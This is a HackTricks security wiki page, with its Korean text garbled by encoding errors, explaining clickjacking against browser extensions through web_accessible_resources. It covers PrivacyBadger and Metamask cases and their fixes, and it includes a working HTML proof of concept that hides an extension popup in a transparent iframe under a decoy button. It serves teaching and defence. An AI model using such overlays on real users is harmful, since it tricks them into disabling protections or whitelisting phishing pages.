# BrowExt - ClickJacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

ì´ í˜ì´ì§€ëŠ” ë¸Œë¼ìš°ì € í™•ì¥ì—ì„œ ClickJacking ì·¨ì•½ì ì„ ì•…ìš©í•  ê²ƒì…ë‹ˆë‹¤.\
ClickJackingì´ ë¬´ì—‡ì¸ì§€ ëª¨ë¥¸ë‹¤ë©´ ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

í™•ì¥ í”„ë¡œê·¸ë¨ì€ **`manifest.json`** íŒŒì¼ì„ í¬í•¨í•˜ê³  ìˆìœ¼ë©°, ì´ JSON íŒŒì¼ì—ëŠ” `web_accessible_resources` í•„ë“œê°€ ìˆìŠµë‹ˆë‹¤. Chrome ë¬¸ì„œì—ì„œ ì´ì— ëŒ€í•´ ë‹¤ìŒê³¼ ê°™ì´ ì„¤ëª…í•©ë‹ˆë‹¤: 

> ì´ëŸ¬í•œ ë¦¬ì†ŒìŠ¤ëŠ” **`chrome-extension://[PACKAGE ID]/[PATH]`** URLì„ í†µí•´ ì›¹ í˜ì´ì§€ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” **`extension.getURL method`**ë¡œ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í—ˆìš©ëœ ë¦¬ì†ŒìŠ¤ëŠ” ì ì ˆí•œ CORS í—¤ë”ì™€ í•¨ê»˜ ì œê³µë˜ë¯€ë¡œ XHRê³¼ ê°™ì€ ë©”ì»¤ë‹ˆì¦˜ì„ í†µí•´ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

ë¸Œë¼ìš°ì € í™•ì¥ì˜ **`web_accessible_resources`**ëŠ” ë‹¨ìˆœíˆ ì›¹ì„ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ê²ƒì´ ì•„ë‹ˆë¼, í™•ì¥ì˜ ê³ ìœ í•œ ê¶Œí•œìœ¼ë¡œ ì‘ë™í•©ë‹ˆë‹¤. ì´ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ê¸°ëŠ¥ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤:

* í™•ì¥ì˜ ìƒíƒœ ë³€ê²½
* ì¶”ê°€ ë¦¬ì†ŒìŠ¤ ë¡œë“œ
* ë¸Œë¼ìš°ì €ì™€ ì–´ëŠ ì •ë„ ìƒí˜¸ì‘ìš©

ê·¸ëŸ¬ë‚˜ ì´ ê¸°ëŠ¥ì€ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•©ë‹ˆë‹¤. **`web_accessible_resources`** ë‚´ì˜ ë¦¬ì†ŒìŠ¤ê°€ ì¤‘ìš”í•œ ê¸°ëŠ¥ì„ ê°€ì§€ê³  ìˆë‹¤ë©´, ê³µê²©ìëŠ” ì´ ë¦¬ì†ŒìŠ¤ë¥¼ ì™¸ë¶€ ì›¹ í˜ì´ì§€ì— ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í˜ì´ì§€ë¥¼ ë°©ë¬¸í•˜ëŠ” ë¬´ì‹¬í•œ ì‚¬ìš©ìëŠ” ì´ ì‚½ì…ëœ ë¦¬ì†ŒìŠ¤ë¥¼ ìš°ì—°íˆ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í™œì„±í™”ëŠ” í™•ì¥ ë¦¬ì†ŒìŠ¤ì˜ ê¶Œí•œê³¼ ê¸°ëŠ¥ì— ë”°ë¼ ì˜ë„ì¹˜ ì•Šì€ ê²°ê³¼ë¥¼ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## PrivacyBadger Example

í™•ì¥ í”„ë¡œê·¸ë¨ PrivacyBadgerì—ì„œ `skin/` ë””ë ‰í† ë¦¬ê°€ ë‹¤ìŒê³¼ ê°™ì´ `web_accessible_resources`ë¡œ ì„ ì–¸ëœ ê²ƒê³¼ ê´€ë ¨ëœ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤ (ì›ë³¸ [ë¸”ë¡œê·¸ ê²Œì‹œë¬¼](https://blog.lizzie.io/clickjacking-privacy-badger.html) í™•ì¸):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
ì´ êµ¬ì„±ì€ ì ì¬ì ì¸ ë³´ì•ˆ ë¬¸ì œë¥¼ ì´ˆë˜í–ˆìŠµë‹ˆë‹¤. êµ¬ì²´ì ìœ¼ë¡œ, ë¸Œë¼ìš°ì €ì—ì„œ PrivacyBadger ì•„ì´ì½˜ê³¼ ìƒí˜¸ì‘ìš©í•  ë•Œ ë Œë”ë§ë˜ëŠ” `skin/popup.html` íŒŒì¼ì´ `iframe` ë‚´ì— ì‚½ì…ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì‚½ì…ì€ ì‚¬ìš©ìê°€ "ì´ ì›¹ì‚¬ì´íŠ¸ì— ëŒ€í•´ PrivacyBadger ë¹„í™œì„±í™”"ë¥¼ ë¬´ì‹¬ì½” í´ë¦­í•˜ë„ë¡ ì†ì´ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í–‰ë™ì€ PrivacyBadger ë³´í˜¸ë¥¼ ë¹„í™œì„±í™”í•˜ì—¬ ì‚¬ìš©ìì˜ ê°œì¸ ì •ë³´ë¥¼ ì†ìƒì‹œí‚¤ê³ , ì‚¬ìš©ìê°€ ë” ë§ì€ ì¶”ì ì„ ë°›ì„ ìˆ˜ ìˆëŠ” ìœ„í—˜ì— ì²˜í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì˜ ì‹œê°ì  ì‹œì—°ì€ [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm)ì—ì„œ ì œê³µëœ ClickJacking ë¹„ë””ì˜¤ ì˜ˆì œë¥¼ í†µí•´ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì„ í•´ê²°í•˜ê¸° ìœ„í•´ ê°„ë‹¨í•œ í•´ê²°ì±…ì´ êµ¬í˜„ë˜ì—ˆìŠµë‹ˆë‹¤: `/skin/*`ì„ `web_accessible_resources` ëª©ë¡ì—ì„œ ì œê±°í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ ë³€ê²½ì€ `skin/` ë””ë ‰í† ë¦¬ì˜ ì½˜í…ì¸ ê°€ ì›¹ ì ‘ê·¼ ê°€ëŠ¥í•œ ë¦¬ì†ŒìŠ¤ë¥¼ í†µí•´ ì ‘ê·¼ë˜ê±°ë‚˜ ì¡°ì‘ë  ìˆ˜ ì—†ë„ë¡ í•˜ì—¬ ìœ„í—˜ì„ íš¨ê³¼ì ìœ¼ë¡œ ì™„í™”í–ˆìŠµë‹ˆë‹¤.

ìˆ˜ì •ì€ ê°„ë‹¨í–ˆìŠµë‹ˆë‹¤: **`web_accessible_resources`ì—ì„œ `/skin/*`ì„ ì œê±°í•˜ì‹­ì‹œì˜¤**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask ì˜ˆì‹œ

A [**blog post about a ClickJacking in metamask can be found here**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). ì´ ê²½ìš°, MetamaskëŠ” ì ‘ê·¼í•˜ëŠ” ë° ì‚¬ìš©ëœ í”„ë¡œí† ì½œì´ **`https:`** ë˜ëŠ” **`http:`**ì¸ì§€ í™•ì¸í•˜ì—¬ ì·¨ì•½ì ì„ ìˆ˜ì •í–ˆìŠµë‹ˆë‹¤ (ì˜ˆ: **`chrome:`** ì•„ë‹˜):

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**Metamask í™•ì¥ í”„ë¡œê·¸ë¨ì—ì„œ ìˆ˜ì •ëœ ë˜ ë‹¤ë¥¸ ClickJacking**ì€ ì‚¬ìš©ìê°€ `â€œweb_accessible_resourcesâ€: [â€œinpage.jsâ€, â€œphishing.htmlâ€]` ë•Œë¬¸ì— í˜ì´ì§€ê°€ í”¼ì‹±ìœ¼ë¡œ ì˜ì‹¬ë  ë•Œ **Click to whitelist**í•  ìˆ˜ ìˆì—ˆë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. í•´ë‹¹ í˜ì´ì§€ê°€ Clickjackingì— ì·¨ì•½í–ˆê¸° ë•Œë¬¸ì—, ê³µê²©ìëŠ” í”¼í•´ìê°€ ì´ë¥¼ ì¸ì‹í•˜ì§€ ëª»í•œ ì±„ë¡œ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ì— ì¶”ê°€í•˜ë„ë¡ í´ë¦­í•˜ê²Œ ë§Œë“¤ê¸° ìœ„í•´ ì •ìƒì ì¸ ê²ƒì„ ë³´ì—¬ì¤„ ìˆ˜ ìˆì—ˆê³ , ê·¸ í›„ í”¼ì‹± í˜ì´ì§€ë¡œ ëŒì•„ê°€ê²Œ ë©ë‹ˆë‹¤.

## Steam Inventory Helper ì˜ˆì‹œ

ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì—¬ **XSS**ê°€ ë¸Œë¼ìš°ì € í™•ì¥ì—ì„œ **ClickJacking** ì·¨ì•½ì ê³¼ ì–´ë–»ê²Œ ì—°ê²°ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## ì°¸ê³ ë¬¸í—Œ

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
